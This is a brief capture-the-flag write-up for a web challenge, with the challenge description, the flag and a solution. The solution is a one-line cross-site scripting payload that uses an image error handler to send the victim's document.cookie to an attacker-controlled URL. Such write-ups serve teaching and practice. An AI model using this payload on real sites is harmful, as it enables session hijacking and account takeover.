# [Web] Xmas Still Stands

> Points: 50
> Solves: 484

## Description

You remember when I said I dropped clam's tables? Well that was on Xmas day. And because I ruined his Xmas, he created the [Anti Xmas Warriors](https://xmas.2020.chall.actf.co) to try to ruin everybody's Xmas. Despite his best efforts, Xmas Still Stands. But, he did manage to get a flag and put it on his site. Can you get it?

## Solution

An easy XSS.

payload: `<img src=x onerror="window.location='url?cookie=' + document.cookie">`

Flag `actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}`
